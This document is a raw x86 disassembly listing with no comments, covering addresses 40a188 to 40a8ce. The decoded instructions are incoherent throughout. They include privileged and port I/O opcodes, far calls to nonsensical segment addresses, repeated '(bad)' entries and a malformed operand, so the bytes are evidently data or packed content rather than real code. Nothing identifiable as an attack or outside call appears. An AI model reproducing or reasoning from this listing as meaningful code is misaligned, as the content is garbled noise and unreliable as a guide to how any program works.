  40a188:	and    eax,0x31ceb3ec
  40a18d:	jg     0x40a181
  40a18f:	in     eax,0xbc
  40a191:	adc    edi,DWORD PTR [edi]
  40a193:	std    
  40a194:	push   ebp
  40a195:	mov    bl,0x1e
  40a197:	mov    al,BYTE PTR [ebx]
  40a199:	mov    ebx,0x2d9f211c
  40a19e:	and    ebp,esp
  40a1a0:	popf   
  40a1a1:	jb     0x40a195
  40a1a3:	push   es
  40a1a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1a5:	ins    BYTE PTR es:[edi],dx
  40a1a6:	imul   ecx,DWORD PTR [ebx],0x73
  40a1a9:	shl    BYTE PTR [edi+0x66],cl
  40a1ac:	push   edi
  40a1ad:	lods   al,BYTE PTR ds:[esi]
  40a1ae:	ss jmp 0x3e1d:0xea973db5
  40a1b6:	sub    eax,0xaa4d8ddb
  40a1bb:	mov    cl,0x62
  40a1bd:	push   esp
  40a1be:	or     al,0xd2
  40a1c0:	sbb    esi,ebx
  40a1c2:	xlat   BYTE PTR ds:[ebx]
  40a1c3:	fnsave [eax-0x74]
  40a1c6:	or     esi,DWORD PTR [esp+esi*8]
  40a1c9:	call   0xcee3:0x4c2ccc2e
  40a1d0:	dec    edi
  40a1d1:	push   edi
  40a1d2:	jne    0x40a1f7
  40a1d4:	mov    edi,0x1a1a9550
  40a1d9:	call   0xaa020298
  40a1de:	mov    ah,0xbe
  40a1e0:	mov    bl,0x50
  40a1e2:	stos   BYTE PTR es:[edi],al
  40a1e3:	adc    esp,eax
  40a1e5:	cmp    cl,cl
  40a1e7:	push   esp
  40a1e8:	mov    ebp,0x8bbfcd1b
  40a1ed:	jb     0x40a264
  40a1ef:	les    esi,FWORD PTR [eax]
  40a1f1:	and    eax,0x503fcbaf
  40a1f6:	mov    cl,0xdd
  40a1f8:	jno    0x40a246
  40a1fa:	inc    edx
  40a1fb:	adc    al,0x5e
  40a1fd:	idiv   BYTE PTR [eax+0x49]
  40a200:	lods   eax,DWORD PTR ds:[esi]
  40a201:	in     al,dx
  40a202:	fisubr DWORD PTR [edx]
  40a204:	sub    al,BYTE PTR [edx+eax*1-0x3]
  40a208:	xchg   esi,eax
  40a209:	lods   al,BYTE PTR ds:[esi]
  40a20a:	ins    BYTE PTR es:[edi],dx
  40a20b:	jo     0x40a25f
  40a20d:	int3   
  40a20e:	cmp    al,0x51
  40a210:	and    dh,BYTE PTR [ebx-0x11]
  40a213:	fldenv [esi+edi*4-0x6fb2d71f]
  40a21a:	pop    esp
  40a21b:	sbb    ebp,ebx
  40a21d:	clc    
  40a21e:	jl     0x40a275
  40a220:	mov    cs,WORD PTR [ebx+0x755992d3]
  40a226:	into   
  40a227:	mov    dh,0x2d
  40a229:	mov    ?,WORD PTR [eax]
  40a22b:	loop   0x40a2a3
  40a22d:	or     dl,ch
  40a22f:	push   eax
  40a230:	test   BYTE PTR [edx+eax*1],dl
  40a233:	sbb    DWORD PTR [ebx-0x792a33ee],edi
  40a239:	fs not esp
  40a23c:	sbb    eax,0x6cd8684f
  40a241:	dec    ebp
  40a242:	fninit 
  40a244:	loope  0x40a2b4
  40a246:	lds    esp,FWORD PTR [eax+0x529d0db8]
  40a24c:	and    DWORD PTR [ebx+0x7ae881bd],0x60b27854
  40a256:	into   
  40a257:	fstp   TBYTE PTR [esp+ecx*4-0x2c337924]
  40a25e:	and    al,0x29
  40a260:	loopne 0x40a240
  40a262:	and    bh,BYTE PTR [edi]
  40a264:	mov    ah,dl
  40a266:	adc    BYTE PTR [esi],bh
  40a268:	mov    ecx,0x8d643d4e
  40a26d:	int    0x63
  40a26f:	inc    esp
  40a270:	fadd   QWORD PTR [eax-0x2d721154]
  40a276:	std    
  40a277:	dec    edx
  40a278:	xchg   ebx,esi
  40a27a:	sub    eax,0x86b9d0be
  40a27f:	push   ds
  40a280:	pop    ebp
  40a281:	call   FWORD PTR [ebx-0x4b13986a]
  40a287:	mov    bh,0x41
  40a289:	jbe    0x40a2ab
  40a28b:	out    dx,al
  40a28c:	fxch   st(0)
  40a28e:	push   cs
  40a28f:	fs jo  0x40a276
  40a292:	sar    bl,1
  40a294:	mov    al,ds:0x387df5a1
  40a299:	pop    esp
  40a29a:	add    BYTE PTR [edx+0x392b6aa5],cl
  40a2a0:	jne    0x40a2e4
  40a2a2:	sbb    dh,bl
  40a2a4:	sbb    ch,BYTE PTR [edi+ecx*2-0x6d0a9231]
  40a2ab:	test   BYTE PTR [edi],bh
  40a2ad:	sub    DWORD PTR [edi],esi
  40a2af:	dec    edx
  40a2b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2b1:	adc    al,0xba
  40a2b3:	enter  0x8d49,0x7b
  40a2b7:	dec    ebx
  40a2b8:	push   esp
  40a2b9:	xor    esp,DWORD PTR [esi+0x7bc70ed7]
  40a2bf:	mov    dh,0x4c
  40a2c1:	adc    DWORD PTR [edi],edx
  40a2c3:	fsubr  QWORD PTR [edi-0x2a7b60dd]
  40a2c9:	lahf   
  40a2ca:	inc    edx
  40a2cb:	adc    ebp,DWORD PTR [ecx]
  40a2cd:	iret   
  40a2ce:	mov    DWORD PTR [edi-0x261447fd],edi
  40a2d4:	test   DWORD PTR [edx-0x79342f46],edi
  40a2da:	inc    edx
  40a2db:	arpl   WORD PTR [eax-0x4d7bce48],di
  40a2e1:	outs   dx,DWORD PTR ds:[esi]
  40a2e2:	loope  0x40a285
  40a2e4:	loopne 0x40a287
  40a2e6:	mov    esp,0x81b8ce9c
  40a2eb:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40a2ed:	dec    BYTE PTR [ebp+0x306915a]
  40a2f3:	hlt    
  40a2f4:	lods   al,BYTE PTR ds:[esi]
  40a2f5:	pusha  
  40a2f6:	es cmp al,0x11
  40a2f9:	add    al,0x1e
  40a2fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2fc:	test   DWORD PTR [ebp-0x65d55f40],esi
  40a302:	sbb    ebp,DWORD PTR [esi-0x73]
  40a305:	inc    esi
  40a306:	(bad)  
  40a307:	test   al,0x16
  40a309:	jp     0x40a31a
  40a30b:	dec    edx
  40a30c:	mov    eax,0xc549a448
  40a311:	adc    DWORD PTR [edx],ebp
  40a313:	pop    esi
  40a314:	sbb    dl,al
  40a316:	jmp    0x64a50ba7
  40a31b:	out    dx,al
  40a31c:	leave  
  40a31d:	ret    
  40a31e:	mov    bh,0xc3
  40a320:	xlat   BYTE PTR ds:[ebx]
  40a321:	aas    
  40a322:	xchg   ecx,eax
  40a323:	repz jp 0x40a324
  40a326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a327:	inc    al
  40a329:	(bad)  
  40a32a:	mov    eax,ds:0x48a3d8ba
  40a32f:	fdiv   DWORD PTR [edx]
  40a331:	inc    edi
  40a332:	(bad)  
  40a334:	sbb    DWORD PTR [edi-0x33],edx
  40a337:	jecxz  0x40a3b7
  40a339:	push   esi
  40a33a:	pop    ecx
  40a33b:	add    al,ah
  40a33d:	jg     0x40a365
  40a33f:	inc    ebx
  40a340:	sahf   
  40a341:	sub    al,0xa5
  40a343:	mov    edx,0x431e7210
  40a348:	mov    al,0x85
  40a34a:	mov    ds:0x474450b5,al
  40a34f:	loop   0x40a317
  40a351:	scas   al,BYTE PTR es:[edi]
  40a352:	inc    ebx
  40a353:	xchg   ebp,eax
  40a354:	push   esi
  40a355:	dec    ebp
  40a356:	and    ch,BYTE PTR [esi+0x11]
  40a359:	jae    0x40a3b5
  40a35b:	pop    ds
  40a35c:	push   eax
  40a35d:	mov    ecx,0xbbce6669
  40a362:	and    eax,0x3ab2d7f
  40a367:	push   es
  40a368:	dec    esp
  40a369:	mov    ebp,edi
  40a36b:	xor    esi,DWORD PTR ds:0xb5cc9eb
  40a371:	loopne 0x40a3f0
  40a373:	test   BYTE PTR [ecx],dh
  40a375:	ret    
  40a376:	ret    
  40a377:	aad    0xc6
  40a379:	call   0xe4b8:0x157ad416
  40a380:	ins    DWORD PTR es:[edi],dx
  40a381:	sub    DWORD PTR [ebx+esi*4+0x67],edi
  40a385:	mov    esp,edi
  40a387:	rcl    BYTE PTR [edi-0x7eb13836],1
  40a38d:	add    ebp,DWORD PTR [eax-0x3e]
  40a390:	imul   dl
  40a392:	outs   dx,DWORD PTR ds:[esi]
  40a393:	cld    
  40a394:	mov    dh,0x24
  40a396:	jg     0x40a32d
  40a398:	hlt    
  40a399:	ins    DWORD PTR es:[edi],dx
  40a39a:	ins    DWORD PTR es:[edi],dx
  40a39b:	mov    ecx,0xca2801df
  40a3a0:	cwde   
  40a3a1:	cmp    edx,edi
  40a3a3:	push   ebx
  40a3a4:	fidiv  WORD PTR [esi+0x29]
  40a3a7:	mov    edx,0x84671ef2
  40a3ac:	pop    esp
  40a3ad:	hlt    
  40a3ae:	dec    esp
  40a3af:	rcl    BYTE PTR [esp+ebp*8],cl
  40a3b2:	xchg   ebp,eax
  40a3b3:	dec    eax
  40a3b4:	jge    0x40a3e8
  40a3b6:	out    0xd6,eax
  40a3b8:	sbb    DWORD PTR [ecx-0x29adb233],0xd4de23b3
  40a3c2:	hlt    
  40a3c3:	(bad)  
  40a3c4:	or     BYTE PTR [eax+0x13e3023],bh
  40a3ca:	mov    al,ds:0x7f3894a3
  40a3cf:	xor    BYTE PTR [ebp+0x71],dl
  40a3d2:	sbb    DWORD PTR [edx+0x27],eax
  40a3d5:	jnp    0x40a418
  40a3d7:	in     eax,0x79
  40a3d9:	xchg   edx,eax
  40a3da:	mov    bl,0x4b
  40a3dc:	mov    edi,0xb79ee92e
  40a3e1:	and    edi,ebp
  40a3e3:	and    cl,dh
  40a3e5:	mov    eax,0x199352cd
  40a3ea:	mov    fs,WORD PTR [ecx+0x86b30b1]
  40a3f0:	ret    
  40a3f1:	fcom   QWORD PTR [ebp+0x417d63bb]
  40a3f7:	stos   DWORD PTR es:[edi],eax
  40a3f8:	fisttp DWORD PTR [ebp+0x6d]
  40a3fb:	cmp    eax,0x2e6fed1b
  40a400:	outs   dx,DWORD PTR ds:[esi]
  40a401:	jecxz  0x40a3af
  40a403:	ja     0x40a3e4
  40a405:	inc    edi
  40a406:	iret   
  40a407:	pushf  
  40a408:	stos   DWORD PTR es:[edi],eax
  40a409:	ss aam 0xcd
  40a40c:	or     ebx,eax
  40a40e:	inc    esp
  40a40f:	xchg   edi,eax
  40a410:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a411:	fmul   QWORD PTR [ecx-0x8]
  40a414:	(bad)  
  40a415:	fstp   DWORD PTR [eax-0x4b]
  40a418:	inc    eax
  40a419:	adc    bl,BYTE PTR [esi+0x26]
  40a41c:	pop    ebx
  40a41d:	and    bl,dl
  40a41f:	mov    edx,DWORD PTR [edx]
  40a421:	xor    eax,0x64096547
  40a426:	je     0x40a49f
  40a428:	scas   eax,DWORD PTR es:[edi]
  40a429:	sub    al,0x33
  40a42b:	test   eax,0xafea915
  40a430:	adc    ebp,DWORD PTR [esi-0x347b3a7b]
  40a436:	addr16 adc eax,0xc70ec00e
  40a43c:	arpl   WORD PTR [edi-0x7e5ae41a],sp
  40a442:	dec    esi
  40a443:	in     eax,0x3
  40a445:	push   0xffffffc3
  40a447:	pop    ecx
  40a448:	hlt    
  40a449:	adc    DWORD PTR [edi+0x1caa0e37],ebp
  40a44f:	sub    BYTE PTR [ecx+0x20],0x95
  40a453:	pushf  
  40a454:	inc    esp
  40a455:	mov    ecx,0xf806a593
  40a45a:	jmp    DWORD PTR [esi-0x7c]
  40a45d:	ds cmp dl,cl
  40a460:	mov    edx,0x554e1343
  40a465:	fist   WORD PTR [eax-0x14]
  40a468:	cmp    cl,BYTE PTR [ebx+0x52]
  40a46b:	cmp    DWORD PTR [edi-0x1c],esp
  40a46e:	lock jle 0x40a3f7
  40a471:	cvtpi2ps xmm6,mm3
  40a474:	cs jle 0x40a4c0
  40a477:	jmp    0xca9:0xe1b4386e
  40a47e:	out    0x29,eax
  40a480:	push   edx
  40a481:	jns    0x40a424
  40a483:	fst    DWORD PTR [edi-0x63fd27f6]
  40a489:	icebp  
  40a48a:	dec    esi
  40a48b:	imul   ebx,DWORD PTR [edx-0x3df1af46],0x69
  40a492:	dec    esp
  40a493:	push   ds
  40a494:	mov    edx,0xbf9363c0
  40a499:	adc    ch,ah
  40a49b:	sbb    BYTE PTR [ecx+0x60f45e5a],cl
  40a4a1:	mov    ds,WORD PTR [ebx]
  40a4a3:	add    DWORD PTR [ecx],0x7ec31304
  40a4a9:	dec    edx
  40a4aa:	dec    eax
  40a4ab:	jmp    0x40a515
  40a4ad:	int3   
  40a4ae:	jae    0x40a504
  40a4b0:	in     eax,dx
  40a4b1:	call   0x121e:0x90b0b9e2
  40a4b8:	sti    
  40a4b9:	addr16 jmp 0xadcd:0xd3ba33d7
  40a4c1:	jecxz  0x40a467
  40a4c3:	(bad)  [edi+0x28e501f6]
  40a4c9:	pop    es
  40a4ca:	dec    ecx
  40a4cb:	sub    BYTE PTR [esi-0x5],bh
  40a4ce:	pop    DWORD PTR [eax+ebp*4+0x4c]
  40a4d2:	outs   dx,BYTE PTR ds:[esi]
  40a4d3:	daa    
  40a4d4:	das    
  40a4d5:	dec    edi
  40a4d6:	clc    
  40a4d7:	mov    ah,0x2
  40a4d9:	push   0xa4eaeeb7
  40a4de:	or     BYTE PTR [edx-0xc38a3a0],bh
  40a4e4:	sub    eax,DWORD PTR [ebx]
  40a4e6:	or     ah,dl
  40a4e8:	and    BYTE PTR [edi+0x6c62622d],al
  40a4ee:	ror    BYTE PTR [esi+ecx*8-0x50],cl
  40a4f2:	in     al,dx
  40a4f3:	add    ebp,edx
  40a4f5:	mov    DWORD PTR [ecx],0xc67877a7
  40a4fb:	ss leave 
  40a4fd:	int    0x12
  40a4ff:	ins    DWORD PTR es:[edi],dx
  40a500:	ins    BYTE PTR es:[edi],dx
  40a501:	sbb    al,0x95
  40a503:	inc    edi
  40a504:	mov    ss,WORD PTR [ebx+eax*4+0x449a399d]
  40a50b:	nop
  40a50c:	ins    DWORD PTR es:[edi],dx
  40a50d:	xor    al,BYTE PTR [ecx-0x79]
  40a510:	xor    eax,DWORD PTR [esi+0x28]
  40a513:	stc    
  40a514:	and    eax,0xab699f5e
  40a519:	loop   0x40a561
  40a51b:	leave  
  40a51c:	adc    eax,0x541227f0
  40a521:	aad    0x11
  40a523:	mov    esp,0x456993df
  40a528:	cwde   
  40a529:	push   esp
  40a52a:	or     al,0x4f
  40a52c:	rcl    DWORD PTR [eax],cl
  40a52e:	add    eax,0x7f587c49
  40a533:	ins    BYTE PTR es:[edi],dx
  40a534:	adc    eax,0x83ab045e
  40a539:	fs pop ss
  40a53b:	call   0x1b64:0x3d868da1
  40a542:	xor    DWORD PTR [ecx+ebp*1],ecx
  40a545:	xchg   DWORD PTR [ebp+0x77],ebp
  40a548:	xor    edi,DWORD PTR [esi-0x42ef28c3]
  40a54e:	and    BYTE PTR [eax+0x3a0f7d5a],dh
  40a554:	mov    dh,0x5b
  40a556:	icebp  
  40a557:	jle    0x40a52a
  40a559:	inc    eax
  40a55a:	scas   eax,DWORD PTR es:[edi]
  40a55b:	and    eax,0x5b47b8d0
  40a560:	lods   eax,DWORD PTR ds:[esi]
  40a561:	ins    BYTE PTR es:[edi],dx
  40a562:	or     BYTE PTR [ebx-0x66dd0b46],dl
  40a568:	hlt    
  40a569:	add    al,0x61
  40a56b:	cli    
  40a56c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a56d:	retf   
  40a56e:	out    dx,al
  40a56f:	xor    BYTE PTR [ebx-0x7d61a9a1],al
  40a575:	(bad)  
  40a576:	mov    dh,dl
  40a578:	std    
  40a579:	jne    0x40a56b
  40a57b:	retf   0x7c8b
  40a57e:	cmp    ah,0x64
  40a581:	clc    
  40a582:	lahf   
  40a583:	shl    DWORD PTR ds:[esi],cl
  40a586:	mov    ebp,0xeadbe046
  40a58b:	loope  0x40a5aa
  40a58d:	arpl   WORD PTR [ebx-0x3d],bp
  40a590:	js     0x40a52e
  40a592:	pop    ss
  40a593:	or     al,0xd9
  40a595:	nop
  40a596:	sahf   
  40a597:	sbb    BYTE PTR [eax+0x77],0xe4
  40a59b:	scas   al,BYTE PTR es:[edi]
  40a59c:	mov    bl,0xde
  40a59e:	and    cl,BYTE PTR [edi+edx*2+0x544c1745]
  40a5a5:	int3   
  40a5a6:	add    cl,BYTE PTR [eax]
  40a5a8:	pop    esp
  40a5a9:	or     al,0xa2
  40a5ab:	in     al,dx
  40a5ac:	call   0x94b:0x6c073e71
  40a5b3:	addr16 cmp eax,0xf47b4e65
  40a5b9:	mov    eax,DWORD PTR [ebp-0x66]
  40a5bc:	rol    DWORD PTR [ebp+0x624dda4f],0xc3
  40a5c3:	mov    eax,0xe89c6691
  40a5c8:	push   eax
  40a5c9:	mov    dl,al
  40a5cb:	and    al,0x31
  40a5cd:	xchg   esp,eax
  40a5ce:	xor    esp,ebx
  40a5d0:	frstor [ecx]
  40a5d2:	sub    eax,0x4a253e87
  40a5d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5d8:	jnp    0x40a5dd
  40a5da:	adc    edi,edx
  40a5dc:	dec    ecx
  40a5dd:	xor    DWORD PTR ds:0xde28a8c,ecx
  40a5e3:	dec    ebp
  40a5e4:	cmp    eax,0x4366be35
  40a5e9:	push   0xcb31e27b
  40a5ee:	inc    ebx
  40a5ef:	imul   edi,DWORD PTR [edx+0x2da0d9b8],0x2d
  40a5f6:	add    esp,ebx
  40a5f8:	adc    edx,DWORD PTR [eax]
  40a5fa:	pop    eax
  40a5fb:	sub    eax,0xc8818dd3
  40a600:	mov    BYTE PTR [eax-0x65],ah
  40a603:	retf   0xdafd
  40a606:	xchg   esi,eax
  40a607:	mov    bh,bh
  40a609:	retf   0x5f0c
  40a60c:	push   esp
  40a60d:	out    0xc2,al
  40a60f:	jg     0x40a65d
  40a611:	sbb    eax,0x2b2eabc2
  40a616:	mov    DWORD PTR [esi-0x38],eax
  40a619:	outs   dx,DWORD PTR ds:[esi]
  40a61a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a61b:	add    ah,BYTE PTR [esi-0x20]
  40a61e:	cmp    BYTE PTR [edx-0x5f],ch
  40a621:	pop    eax
  40a622:	mov    cl,0x6b
  40a624:	mov    eax,ds:0xd950e55
  40a629:	inc    esi
  40a62a:	xchg   esp,eax
  40a62b:	xlat   BYTE PTR ds:[ebx]
  40a62c:	jg     0x40a644
  40a62e:	add    eax,0x343506dc
  40a633:	std    
  40a634:	jbe    0x40a61e
  40a636:	icebp  
  40a637:	icebp  
  40a638:	sub    al,0x4c
  40a63a:	jecxz  0x40a676
  40a63c:	sub    eax,0xcef62918
  40a641:	pop    edi
  40a642:	lods   al,BYTE PTR ds:[esi]
  40a643:	stos   BYTE PTR es:[edi],al
  40a644:	sub    ebp,DWORD PTR [ecx+0x2c]
  40a647:	jg     0x40a667
  40a649:	sbb    dh,bl
  40a64b:	xor    DWORD PTR [eax],esi
  40a64d:	jb     0x40a695
  40a64f:	pop    ss
  40a650:	lods   eax,DWORD PTR ds:[esi]
  40a651:	mov    bl,0x93
  40a653:	mov    ecx,0x73658587
  40a658:	lods   eax,DWORD PTR ds:[esi]
  40a659:	retf   
  40a65a:	lock leavew 
  40a65d:	xchg   ecx,eax
  40a65e:	js     0x40a62c
  40a660:	sub    DWORD PTR [edi-0x6622606d],eax
  40a666:	popa   
  40a667:	sub    BYTE PTR [ebx+ebx*2+0x5291a67],dh
  40a66e:	lock xor esp,DWORD PTR [ebp+0x24]
  40a672:	mov    WORD PTR [ebx],gs
  40a674:	lods   al,BYTE PTR ds:[esi]
  40a675:	inc    esp
  40a676:	pusha  
  40a677:	sub    dh,BYTE PTR [eax-0x2f]
  40a67a:	mov    eax,0xd473600b
  40a67f:	adc    DWORD PTR [edi+0x27],0xecf826bc
  40a686:	sub    eax,DWORD PTR fs:[edx+0x42]
  40a68a:	call   0xf9ac31a4
  40a68f:	jne    0x40a619
  40a691:	xlat   BYTE PTR ds:[ebx]
  40a692:	cmp    eax,0x5d447fb7
  40a697:	push   es
  40a698:	mov    bh,BYTE PTR [ebx+0x3a2a2232]
  40a69e:	dec    esi
  40a69f:	jle    0x40a665
  40a6a1:	adc    dl,al
  40a6a3:	and    BYTE PTR [ebp+0x4d],ah
  40a6a6:	xor    BYTE PTR [edx+0x6c],0x28
  40a6aa:	retf   
  40a6ab:	cmp    eax,0x4cafbfa2
  40a6b0:	add    al,0x64
  40a6b2:	sbb    al,0x5f
  40a6b4:	std    
  40a6b5:	fnstcw WORD PTR [edx+0x53]
  40a6b8:	ss aaa 
  40a6ba:	fcmovnbe st,st(2)
  40a6bc:	xor    DWORD PTR [ecx],esi
  40a6be:	xcrypt-ctr (bad)
  40a6bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6c0:	fmul   QWORD PTR [ebx+0x38]
  40a6c3:	adc    bl,BYTE PTR [edi]
  40a6c5:	push   ss
  40a6c6:	aas    
  40a6c7:	dec    edi
  40a6c8:	in     eax,dx
  40a6c9:	cmp    dh,ah
  40a6cb:	pop    ds
  40a6cc:	ret    0xbaa0
  40a6cf:	fimul  DWORD PTR [edi]
  40a6d1:	push   esi
  40a6d2:	or     dh,ch
  40a6d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6d5:	adc    eax,0xda2438ea
  40a6da:	inc    esi
  40a6db:	inc    bx
  40a6dd:	rcr    BYTE PTR [eax],1
  40a6df:	xor    al,0xaa
  40a6e1:	inc    edx
  40a6e2:	test   eax,0xc53c6e42
  40a6e7:	dec    edi
  40a6e8:	ficomp DWORD PTR ds:0xd89a5deb
  40a6ee:	jecxz  0x40a675
  40a6f0:	mov    DWORD PTR [edx],eax
  40a6f2:	pop    ds
  40a6f3:	cmc    
  40a6f4:	add    eax,0x627b0c15
  40a6f9:	test   DWORD PTR [edi],ebp
  40a6fb:	xlat   BYTE PTR ds:[ebx]
  40a6fc:	mov    WORD PTR [ebx+ecx*8-0x63],cs
  40a700:	lods   al,BYTE PTR ss:[esi]
  40a702:	(bad)  
  40a703:	jecxz  0x40a73e
  40a705:	pop    ebp
  40a706:	es push edi
  40a708:	jbe    0x40a6e9
  40a70a:	shr    DWORD PTR [ebx+edx*8-0x1c],1
  40a70e:	stos   BYTE PTR es:[edi],al
  40a70f:	mov    bl,0x2d
  40a711:	and    eax,0x93d3a933
  40a716:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a717:	das    
  40a718:	test   DWORD PTR [esp+edx*8],ebx
  40a71b:	inc    eax
  40a71c:	dec    esi
  40a71d:	xchg   ebx,edi
  40a71f:	stos   DWORD PTR es:[edi],eax
  40a720:	xor    edx,ebx
  40a722:	sbb    al,0x6c
  40a724:	lahf   
  40a725:	fimul  WORD PTR [ecx-0x49638461]
  40a72b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a72c:	xor    BYTE PTR [ebx],bl
  40a72e:	jp     0x40a6be
  40a730:	aas    
  40a731:	mov    eax,0x45b8a966
  40a736:	pop    edi
  40a737:	ins    DWORD PTR es:[edi],dx
  40a738:	sbb    al,0xf
  40a73a:	aaa    
  40a73b:	repnz fdiv st(7),st
  40a73e:	and    eax,0xeb9978e4
  40a743:	sbb    al,0x8
  40a745:	ss pop eax
  40a747:	mov    DWORD PTR [eax+ebp*4],ecx
  40a74a:	jecxz  0x40a714
  40a74c:	ins    DWORD PTR es:[edi],dx
  40a74d:	je     0x40a6ef
  40a74f:	dec    ecx
  40a750:	jl     0x40a6d6
  40a752:	xor    bh,ah
  40a754:	mov    bl,0xce
  40a756:	lock jmp 0x40a79f
  40a759:	jb     0x40a722
  40a75b:	inc    esi
  40a75c:	mov    DWORD PTR [edx+0x36163bf7],edx
  40a762:	data16 js 0x40a7ae
  40a765:	push   es
  40a766:	add    BYTE PTR [esp+eiz*2-0x78a613c9],dl
  40a76d:	int3   
  40a76e:	call   0x44a359ce
  40a773:	and    ebx,DWORD PTR [edi+0x50]
  40a776:	pop    esi
  40a777:	inc    edi
  40a778:	mov    al,ds:0xf0204f35
  40a77d:	inc    ecx
  40a77e:	retf   
  40a77f:	jnp    0x40a7df
  40a781:	outs   dx,DWORD PTR ds:[esi]
  40a782:	arpl   WORD PTR [edx+ecx*1],dx
  40a785:	je     0x40a725
  40a787:	ret    
  40a788:	inc    edx
  40a789:	dec    esi
  40a78a:	pop    esp
  40a78b:	in     eax,0xde
  40a78d:	sahf   
  40a78e:	outs   dx,BYTE PTR ds:[esi]
  40a78f:	mov    ch,BYTE PTR ds:0xda7c49dd
  40a795:	mov    ds:0x363a7a3c,al
  40a79a:	mov    edx,0xb0d79f0e
  40a79f:	push   edx
  40a7a0:	out    dx,eax
  40a7a1:	fild   QWORD PTR [esi-0x44868f93]
  40a7a7:	add    BYTE PTR ss:[edi],dl
  40a7aa:	leave  
  40a7ab:	jae    0x40a7b2
  40a7ad:	cmp    eax,0xf3d31f7b
  40a7b2:	or     cl,al
  40a7b4:	mov    ch,0xa9
  40a7b6:	push   0xffffffb7
  40a7b8:	(bad)  
  40a7b9:	xchg   edx,eax
  40a7ba:	sti    
  40a7bb:	xchg   ecx,eax
  40a7bc:	stos   DWORD PTR es:[edi],eax
  40a7bd:	sti    
  40a7be:	fstp   QWORD PTR [edx+0x7a]
  40a7c1:	pusha  
  40a7c2:	loope  0x40a823
  40a7c4:	fld    DWORD PTR [esi+esi*2]
  40a7c7:	push   0x19
  40a7c9:	sti    
  40a7ca:	fstp   DWORD PTR [edx+0x75f4ad9b]
  40a7d0:	jae    0x40a81a
  40a7d2:	fcmovb st,st(0)
  40a7d4:	pusha  
  40a7d5:	push   esi
  40a7d6:	adc    ebx,ecx
  40a7d8:	xchg   DWORD PTR [eax-0x51],eax
  40a7db:	aam    0x8f
  40a7dd:	ror    DWORD PTR [eax+0x65],cl
  40a7e0:	leave  
  40a7e1:	ds jge 0x40a770
  40a7e4:	test   BYTE PTR fs:[eax+0x4a],0x5
  40a7e9:	push   ebp
  40a7ea:	shl    BYTE PTR [eax+0x7309e0a],0x58
  40a7f1:	dec    edx
  40a7f2:	cmc    
  40a7f3:	paddb  mm0,QWORD PTR [edx+edx*8-0xe9259ba]
  40a7fb:	push   0xc1afaa0e
  40a800:	or     al,0xd6
  40a802:	pop    ds
  40a803:	sbb    eax,0xaec7f6c0
  40a808:	aad    0xaf
  40a80a:	inc    ecx
  40a80b:	lods   eax,DWORD PTR ds:[esi]
  40a80c:	inc    ebx
  40a80d:	inc    edx
  40a80e:	ffree  st(0)
  40a810:	sub    ah,dl
  40a812:	ins    BYTE PTR es:[edi],dx
  40a813:	mov    ebx,DWORD PTR [ebx]
  40a815:	fimul  WORD PTR [ebx+0x50]
  40a818:	inc    esp
  40a819:	jbe    0x40a801
  40a81b:	(bad)  
  40a81c:	pop    esi
  40a81d:	jns    0x40a880
  40a81f:	das    
  40a820:	std    
  40a821:	aad    0xfa
  40a823:	inc    edx
  40a824:	icebp  
  40a825:	stos   BYTE PTR es:[edi],al
  40a826:	sbb    dl,ah
  40a828:	test   DWORD PTR [edi],edx
  40a82a:	loop   0x40a88b
  40a82c:	jns    0x40a7d9
  40a82e:	int    0xc5
  40a830:	ficomp DWORD PTR [edi+ecx*1+0x1c]
  40a834:	adc    ebx,DWORD PTR [eax]
  40a836:	xchg   BYTE PTR [edx*1-0x747e4061],ch
  40a83d:	sbb    al,0xa7
  40a83f:	mov    dh,0x25
  40a841:	rol    BYTE PTR [edx+0x28],0x4b
  40a845:	nop
  40a846:	adc    al,0x4a
  40a848:	inc    esp
  40a849:	fisttp WORD PTR [edi-0x3f]
  40a84c:	test   al,0xb7
  40a84e:	loopne 0x40a842
  40a850:	mov    eax,0x70e8a6da
  40a855:	sbb    BYTE PTR [edx-0x239b3609],bl
  40a85b:	js     0x40a881
  40a85d:	rol    ecx,0x3a
  40a860:	lahf   
  40a861:	je     0x40a898
  40a863:	mov    ebp,0xc5f69d34
  40a868:	xor    cl,BYTE PTR [edi+0x30]
  40a86b:	push   0x78dc6599
  40a870:	and    DWORD PTR [ecx-0x51],esi
  40a873:	push   edi
  40a874:	ss nop
  40a876:	xor    DWORD PTR [edi],ecx
  40a878:	test   DWORD PTR [ebp+0x215c8e98],esp
  40a87e:	fucomi st,st(5)
  40a880:	(bad)  
  40a881:	pop    esp
  40a882:	out    0xca,eax
  40a884:	sub    DWORD PTR [edi*1+0x3327e060],esi
  40a88b:	pop    ecx
  40a88c:	mov    ah,0xa0
  40a88e:	xchg   ecx,eax
  40a88f:	enter  0x38b5,0x9f
  40a893:	add    BYTE PTR [ebx+0x8],dl
  40a896:	ins    DWORD PTR es:[edi],dx
  40a897:	clc    
  40a898:	js     0x40a8a0
  40a89a:	clc    
  40a89b:	stos   DWORD PTR es:[edi],eax
  40a89c:	call   0x7d0c:0x50675499
  40a8a3:	dec    esp
  40a8a4:	jo     0x40a8de
  40a8a6:	loope  0x40a8e0
  40a8a8:	fwait
  40a8a9:	sub    al,0xb0
  40a8ab:	jo     0x40a91f
  40a8ad:	mov    ch,0x9f
  40a8af:	sbb    DWORD PTR [edx],esp
  40a8b1:	jns    0x40a8ae
  40a8b3:	call   0xf6c3147e
  40a8b8:	cld    
  40a8b9:	jecxz  0x40a909
  40a8bb:	icebp  
  40a8bc:	mov    bl,dl
  40a8be:	inc    esp
  40a8bf:	xor    eax,0x70de01de
  40a8c4:	fsubrp st(7),st
  40a8c6:	out    dx,al
  40a8c7:	inc    eax
  40a8c8:	inc    ebx
  40a8c9:	or     eax,0x1626c65e
  40a8ce:	dec    ebx
